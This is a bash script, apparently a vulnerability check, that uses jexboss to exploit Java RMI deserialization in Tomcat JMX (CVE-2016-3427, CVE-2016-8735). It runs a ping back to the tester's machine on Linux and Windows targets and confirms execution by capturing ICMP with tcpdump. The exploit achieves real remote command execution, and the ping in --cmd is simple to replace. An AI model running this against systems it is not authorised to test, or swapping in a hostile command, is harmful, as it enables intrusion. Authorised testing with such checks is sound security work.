#!/usr/bin/env bash

print_title() {
        BOLD=$(tput bold ; tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD} $1 ${NORMAL}"
}

print_info() {
        BOLD=$(tput bold)
        BLUE=$(tput setaf 4)
        NORMAL=$(tput sgr0)
        echo "${BOLD}${BLUE}[~] ${NORMAL}${BLUE}$1 ${NORMAL}"
}


IP=$1
PORT=$2
LOCALIP=$3

echo
echo
print_title "================================================================="
print_title "Java-RMI Deserialize in Tomcat JMX (CVE-2016-3427, CVE-2016-8735)" 
print_title "                 Check with Jexboss                              "
print_title "================================================================="
echo

print_info "WARNING: This attack box must be reachable from the target !"
echo
print_info "Will try to ping local IP = ${LOCALIP} from target"

print_info "Running tcpdump in background to try to capture ICMP requests if service is vuln..."
sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"

print_info "Running jexboss command for target Linux:"
print_info "python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --cmd \"/bin/ping -c 4 ${LOCALIP}\""
python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --cmd "/bin/ping -c 4 ${LOCALIP}" --disable-check-updates > /tmp/jexboss-output.txt
tail -n +4 /tmp/jexboss-output.txt
rm /tmp/jexboss-output.txt

print_info "Wait a little bit..."
sleep 3
PID=$(ps -e | pgrep tcpdump)
print_info "Kill tcpdump (PID=${PID})"
sudo kill -9 $PID 
sleep 2

print_info "Captured ICMP traffic:"
echo
sudo tcpdump -r /tmp/dump.pcap
echo
print_info "Delete capture"
sudo rm /tmp/dump.pcap


print_info "Restart tcpdump"
sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"

print_info "Running jexboss command for target Windows:"
print_info "python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --windows --cmd \"ping -n 4 ${LOCALIP}\""
python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --windows --cmd "ping -n 4 ${LOCALIP}" --disable-check-updates > /tmp/jexboss-output.txt
tail -n +4 /tmp/jexboss-output.txt
rm /tmp/jexboss-output.txt

print_info "Wait a little bit..."
sleep 3
PID=$(ps -e | pgrep tcpdump)
print_info "Kill tcpdump (PID=${PID})"
sudo kill -9 $PID 
sleep 2

print_info "Captured ICMP traffic:"
echo
sudo tcpdump -r /tmp/dump.pcap
echo
print_info "Delete capture"
sudo rm /tmp/dump.pcap

